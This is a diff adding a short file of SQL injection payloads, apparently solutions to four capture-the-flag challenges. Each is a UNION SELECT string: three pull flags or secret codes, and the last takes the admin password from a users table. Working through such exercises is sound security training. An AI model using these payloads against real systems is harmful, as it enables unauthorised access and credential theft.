@@ -1,0 +1,15 @@
+challenge1 payload:
+
+' UNION SELECT flag FROM flags --
+
+challenge2 payload:
+
+1 UNION SELECT flag, NULL, NULL FROM hidden_flag --
+
+challenge3 payload:
+
+' UNION SELECT secret_code, NULL FROM library_secrets --
+
+challenge4 payload:
+
+x' UNION SELECT password FROM users WHERE username='admin' --
